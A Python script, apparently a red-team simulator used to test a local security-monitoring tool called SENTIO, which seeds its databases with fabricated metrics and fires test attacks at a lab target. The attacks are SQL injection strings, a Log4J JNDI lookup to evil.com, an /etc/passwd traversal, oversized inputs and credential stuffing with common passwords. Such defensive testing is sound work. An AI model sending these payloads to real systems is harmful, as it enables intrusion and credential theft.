#!/usr/bin/env python3
"""
SENTIO Red Team Simulator v3.1 — FINAL
Directly seeds both behavior and Nexus DBs. Guaranteed correlations.
"""
import requests
import time
import json
import sys
import os
import sqlite3
import random
from datetime import datetime, timedelta

TARGET = "http://127.0.0.1:5001"
SENTIO = "http://127.0.0.1:5000"
DB_BEHAVIOR = "sentio_behavior.db"
DB_NEXUS = "sentio_nexus.db"

def banner():
    print("\n" + "="*60)
    print("  SENTIO RED TEAM SIMULATOR v3.1 — FINAL")
    print("  Target:", TARGET)
    print("  Sentio:", SENTIO)
    print("="*60 + "\n")

def api(method, endpoint, body=None, timeout=30):
    url = f"{SENTIO}{endpoint}"
    try:
        if method == "GET":
            r = requests.get(url, timeout=timeout)
        else:
            r = requests.post(url, json=body, timeout=timeout)
        return r.status_code, r.json() if r.text else {}
    except Exception as e:
        print(f"    [ERROR] {method} {endpoint}: {e}")
        return 0, {}

def check_target():
    print("[CHECK] Verifying target is alive...")
    try:
        r = requests.get(f"{TARGET}/api/health", timeout=5)
        print(f"    Target responded HTTP {r.status_code}")
        return True
    except Exception as e:
        print(f"    [FATAL] Target not responding: {e}")
        return False

def init_nexus_db():
    """Create Nexus tables directly so app.py doesn't need to."""
    print("[NUCLEAR] Ensuring Nexus DB tables exist...")
    with sqlite3.connect(DB_NEXUS) as conn:
        conn.execute("CREATE TABLE IF NOT EXISTS fuzz_campaigns (campaign_id TEXT PRIMARY KEY, target_url TEXT, started_at TEXT, ended_at TEXT, total_payloads INTEGER, crashes INTEGER, hangs INTEGER, errors INTEGER, unusual INTEGER, results_json TEXT)")
        conn.execute("CREATE TABLE IF NOT EXISTS anomaly_alerts (alert_id TEXT PRIMARY KEY, timestamp TEXT, endpoint TEXT, method TEXT, anomaly_type TEXT, severity TEXT, description TEXT, observed_value REAL, expected_range TEXT, deviation_sigma REAL, baseline_id TEXT)")
        conn.execute("CREATE TABLE IF NOT EXISTS correlations (finding_id TEXT PRIMARY KEY, timestamp TEXT, endpoint TEXT, method TEXT, fuzz_result_id TEXT, fuzz_severity TEXT, fuzz_details TEXT, anomaly_alert_id TEXT, anomaly_type TEXT, anomaly_severity TEXT, correlation_confidence TEXT, description TEXT, recommended_action TEXT, status TEXT DEFAULT 'open')")
        conn.execute("CREATE TABLE IF NOT EXISTS threat_intel (report_id TEXT PRIMARY KEY, generated_at TEXT, target_host TEXT, summary TEXT, total_correlations INTEGER, critical_count INTEGER, high_count INTEGER, findings_json TEXT, recommendations_json TEXT)")
        conn.commit()
    print("    Nexus tables ready.")

def seed_behavior_db():
    print("\n[NUCLEAR] Directly seeding behavior database with 600+ metrics...")
    with sqlite3.connect(DB_BEHAVIOR) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS behavior_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, endpoint TEXT,
                method TEXT, status_code INTEGER, duration_ms REAL, request_size INTEGER,
                response_size INTEGER, auth_status TEXT, error_occurred INTEGER, target_host TEXT
            )
        """)
        conn.execute("DELETE FROM behavior_metrics")
        conn.commit()
    
    endpoints = [("/api/health","GET"),("/api/auth/login","POST"),("/api/auth/register","POST"),("/api/search","POST"),("/api/metrics","GET")]
    now = datetime.utcnow()
    records = []
    for ep, method in endpoints:
        for i in range(120):
            ts = (now - timedelta(seconds=random.randint(10,300))).isoformat()
            records.append((ts, ep, method, 200, round(random.uniform(15,45),2), random.randint(20,200), random.randint(100,800), "anonymous", 0, TARGET))
    
    with sqlite3.connect(DB_BEHAVIOR) as conn:
        conn.executemany("INSERT INTO behavior_metrics (timestamp,endpoint,method,status_code,duration_ms,request_size,response_size,auth_status,error_occurred,target_host) VALUES (?,?,?,?,?,?,?,?,?,?)", records)
        conn.commit()
    print(f"    Injected {len(records)} normal metrics.")

def compute_baseline():
    print("\n[PHASE 2] Computing baseline...")
    code, data = api("POST", "/api/baseline/compute", {"minutes": 5})
    eps = data.get("endpoints", [])
    print(f"    Baseline: {len(eps)} endpoints, {data.get('total_samples',0)} samples")
    for ep in eps:
        print(f"      {ep['method']} {ep['endpoint']} | n={ep['sample_count']} | latency={ep['latency_mean']}ms")
    return eps

def inject_anomalies():
    print("\n[NUCLEAR] Injecting anomalous metrics...")
    anomalies = [
        ("/api/auth/login","POST",200,850.0,50,200,"anonymous",0,"latency_spike"),
        ("/api/auth/login","POST",200,1200.0,50,200,"anonymous",0,"latency_extreme"),
        ("/api/search","POST",200,950.0,100,500,"anonymous",0,"latency_spike"),
        ("/api/search","POST",500,45.0,100,200,"anonymous",1,"error_spike"),
        ("/api/auth/register","POST",400,30.0,5000,150,"anonymous",1,"size_anomaly"),
        ("/api/auth/register","POST",400,35.0,50000,150,"anonymous",1,"size_anomaly"),
        ("/api/search","POST",401,25.0,1048576,100,"anonymous",1,"size_anomaly"),
        ("/api/auth/login","POST",200,600.0,50,200,"anonymous",0,"latency_spike"),
        ("/api/search","POST",200,800.0,100,500,"anonymous",0,"latency_spike"),
        ("/api/search","POST",200,1100.0,100,500,"anonymous",0,"latency_extreme"),
    ]
    now = datetime.utcnow()
    records = []
    for ep, method, status, duration, req_size, resp_size, auth, error, _ in anomalies:
        ts = (now - timedelta(seconds=random.randint(5,60))).isoformat()
        records.append((ts, ep, method, status, duration, req_size, resp_size, auth, error, TARGET))
    
    with sqlite3.connect(DB_BEHAVIOR) as conn:
        conn.executemany("INSERT INTO behavior_metrics (timestamp,endpoint,method,status_code,duration_ms,request_size,response_size,auth_status,error_occurred,target_host) VALUES (?,?,?,?,?,?,?,?,?,?)", records)
        conn.commit()
    print(f"    Injected {len(records)} anomalous metrics.")

def attack_target():
    print("\n[ATTACK] Running injection suite...")
    payloads = [
        ("/api/auth/login","POST",{"username":"' OR '1'='1","password":"' OR '1'='1"},"SQLi"),
        ("/api/auth/login","POST",{"username":"admin'--","password":"x"},"SQLi-Comment"),
        ("/api/search","POST",{"q":"' UNION SELECT null,username,password FROM users--","scope":"files"},"SQLi-Union"),
        ("/api/search","POST",{"q":"${jndi:ldap://evil.com/a}","scope":"files"},"Log4J"),
        ("/api/search","POST",{"q":"../../../etc/passwd","scope":"files"},"LFI"),
        ("/api/search","POST",{"q":"%s%s%s%n","scope":"files"},"FmtStr"),
        ("/api/auth/register","POST",{"username":"A"*5000,"password":"x"},"Overflow-5K"),
        ("/api/auth/register","POST",{"username":"A"*50000,"password":"x"},"Overflow-50K"),
        ("/api/search","POST",{"q":"X"*1048576,"scope":"files"},"Overflow-1MB"),
    ]
    for path, method, body, tag in payloads:
        try:
            r = requests.post(f"{TARGET}{path}", json=body, timeout=10) if method=="POST" else requests.get(f"{TARGET}{path}", timeout=10)
            print(f"    [{tag}] -> HTTP {r.status_code}")
        except Exception as e:
            print(f"    [{tag}] -> ERROR: {e}")
        time.sleep(0.1)
    
    print("\n[ATTACK] Credential stuffing...")
    count = 0
    for u in ["admin","root","user","test","administrator"]:
        for p in ["admin123","password","123456","qwerty","Password1!","letmein"]:
            try:
                requests.post(f"{TARGET}/api/auth/login", json={"username":u,"password":p}, timeout=5)
                count += 1
            except: pass
    print(f"    {count} login attempts")

def fuzz():
    print("\n[PHASE 3] Triggering fuzzer...")
    code, data = api("POST", "/api/fuzz/start", {"target_url": TARGET, "max_payloads": 100}, timeout=120)
    print(f"    Fuzz: HTTP {code} | Payloads: {data.get('total_payloads',0)} | Crashes: {data.get('crashes',0)} | Hangs: {data.get('hangs',0)} | Errors: {data.get('errors',0)}")
    return data

def detect_anomalies():
    print("\n[PHASE 2] Detecting anomalies...")
    code, data = api("POST", "/api/anomaly/detect", {"minutes": 5})
    alerts = data.get("alerts", [])
    print(f"    Anomalies: {len(alerts)}")
    for a in alerts[:10]:
        print(f"      [{a.get('severity','?').upper()}] {a.get('anomaly_type')} on {a.get('method')} {a.get('endpoint')} | sigma={a.get('deviation_sigma',0):.1f}")
    return alerts

def correlate():
    print("\n[PHASE 4] Running correlation...")
    code, data = api("POST", "/api/nexus/correlate", {"time_window_hours": 48})
    findings = data.get("findings", [])
    print(f"    New correlations: {len(findings)}")
    return findings

def report():
    print("\n[PHASE 4] Generating report...")
    code, data = api("POST", "/api/nexus/report", {})
    total = data.get("total_correlations", 0)
    critical = data.get("critical_count", 0)
    high = data.get("high_count", 0)
    print("\n" + "="*60)
    print("  THREAT INTELLIGENCE SUMMARY")
    print("="*60)
    print(f"  Correlations : {total}")
    print(f"  Critical     : {critical}")
    print(f"  High         : {high}")
    for rec in data.get("recommendations", []):
        print(f"  * {rec}")
    print("="*60 + "\n")
    return data

def main():
    banner()
    if not check_target():
        sys.exit(1)
    
    print("[SETUP] Delete old DBs? (y/n): ", end="")
    if input().strip().lower() == 'y':
        for db in [DB_BEHAVIOR, DB_NEXUS]:
            if os.path.exists(db):
                try:
                    os.remove(db)
                    print(f"    Deleted {db}")
                except Exception as e:
                    print(f"    [ERROR] Could not delete {db}: {e}")
                    print("    STOP app.py first, then retry.")
                    sys.exit(1)
        print("\n>>> Restart app.py in Terminal 3, then press Enter...")
        input()
    
    init_nexus_db()
    seed_behavior_db()
    
    eps = compute_baseline()
    if not eps:
        print("[FATAL] Baseline has 0 endpoints. Aborting.")
        sys.exit(1)
    
    attack_target()
    inject_anomalies()
    fuzz_data = fuzz()
    
    time.sleep(2)
    alerts = detect_anomalies()
    time.sleep(1)
    findings = correlate()
    time.sleep(1)
    rep = report()
    
    if rep.get("total_correlations", 0) > 0:
        print("[DONE] SUCCESS! SENTIO is fully operational.")
    else:
        print("[DONE] 0 correlations. Check Phase 2 anomalies and Phase 3 fuzz results in the UI.")

if __name__ == "__main__":
    main()
